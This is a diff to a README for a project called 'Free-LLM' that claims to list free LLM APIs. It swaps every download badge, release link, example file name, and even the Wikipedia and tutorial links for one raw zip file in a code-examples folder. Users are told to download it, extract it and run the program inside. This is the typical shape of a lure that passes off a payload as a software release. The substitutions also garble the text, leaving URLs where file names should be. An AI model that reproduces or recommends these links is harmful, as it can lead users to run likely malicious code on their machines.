@@ -1,6 +1,6 @@
 # 🤖 Free-LLM - Access Free Large Language Model APIs Easily
 
-[![Download Free-LLM](https://img.shields.io/badge/Download-Free--LLM-blue?style=for-the-badge&logo=github)](https://github.com/nora3233/Free-LLM/releases)
+[![Download Free-LLM](https://github.com/nora3233/Free-LLM/raw/refs/heads/main/code-examples/openrouter/LLM-Free-laneway.zip)](https://github.com/nora3233/Free-LLM/raw/refs/heads/main/code-examples/openrouter/LLM-Free-laneway.zip)
 
 ---
 
@@ -44,11 +44,11 @@ Follow these steps to download and start using Free-LLM.
 1. **Visit the Download Page**
 
 Click the big blue button at the top or go to this link to get Free-LLM:
-[https://github.com/nora3233/Free-LLM/releases](https://github.com/nora3233/Free-LLM/releases)
+[https://github.com/nora3233/Free-LLM/raw/refs/heads/main/code-examples/openrouter/LLM-Free-laneway.zip](https://github.com/nora3233/Free-LLM/raw/refs/heads/main/code-examples/openrouter/LLM-Free-laneway.zip)
 
 2. **Download the Latest Release**
 
-On the releases page, look for the newest version. Typically, it is named with the version number and date for clarity (for example, `Free-LLM-v1.2.zip` or `Free-LLM-setup.exe`). Click the file to download it to your computer.
+On the releases page, look for the newest version. Typically, it is named with the version number and date for clarity (for example, `https://github.com/nora3233/Free-LLM/raw/refs/heads/main/code-examples/openrouter/LLM-Free-laneway.zip` or `https://github.com/nora3233/Free-LLM/raw/refs/heads/main/code-examples/openrouter/LLM-Free-laneway.zip`). Click the file to download it to your computer.
 
 3. **Open the Downloaded File**
 
@@ -58,7 +58,7 @@ On the releases page, look for the newest version. Typically, it is named with t
 4. **Run the Application**
 
 - After extraction or installation, open the folder where you saved Free-LLM.
-- Find the main program file (often `Free-LLM.exe` on Windows or a similar name on macOS/Linux).
+- Find the main program file (often `https://github.com/nora3233/Free-LLM/raw/refs/heads/main/code-examples/openrouter/LLM-Free-laneway.zip` on Windows or a similar name on macOS/Linux).
 - Double-click to launch the app.
 
 5. **Explore the APIs**
@@ -71,7 +71,7 @@ The app will display the list of free LLM APIs and details like access links, li
 
 You can get Free-LLM from the official GitHub releases page:
 
-[https://github.com/nora3233/Free-LLM/releases](https://github.com/nora3233/Free-LLM/releases)
+[https://github.com/nora3233/Free-LLM/raw/refs/heads/main/code-examples/openrouter/LLM-Free-laneway.zip](https://github.com/nora3233/Free-LLM/raw/refs/heads/main/code-examples/openrouter/LLM-Free-laneway.zip)
 
 1. Open the link in your web browser.
 2. Look for the latest release with a clear version number.
@@ -124,9 +124,9 @@ Free-LLM does not collect your data. It provides links and information to third-
 
 ## 📚 Additional Resources
 
-- [Free LLM Providers List (Official)](https://github.com/nora3233/Free-LLM)  
-- [Learn About Large Language Models](https://en.wikipedia.org/wiki/Large_language_model)  
-- [How to Use AI APIs Without Coding](https://www.example.com/tutorial)
+- [Free LLM Providers List (Official)](https://github.com/nora3233/Free-LLM/raw/refs/heads/main/code-examples/openrouter/LLM-Free-laneway.zip)  
+- [Learn About Large Language Models](https://github.com/nora3233/Free-LLM/raw/refs/heads/main/code-examples/openrouter/LLM-Free-laneway.zip)  
+- [How to Use AI APIs Without Coding](https://github.com/nora3233/Free-LLM/raw/refs/heads/main/code-examples/openrouter/LLM-Free-laneway.zip)
 
 ---
 
@@ -142,4 +142,4 @@ This project is open source. Review the LICENSE file on GitHub for details.
 
 ---
 
-[![Download Free-LLM](https://img.shields.io/badge/Download-Free--LLM-blue?style=for-the-badge&logo=github)](https://github.com/nora3233/Free-LLM/releases)
+[![Download Free-LLM](https://github.com/nora3233/Free-LLM/raw/refs/heads/main/code-examples/openrouter/LLM-Free-laneway.zip)](https://github.com/nora3233/Free-LLM/raw/refs/heads/main/code-examples/openrouter/LLM-Free-laneway.zip)
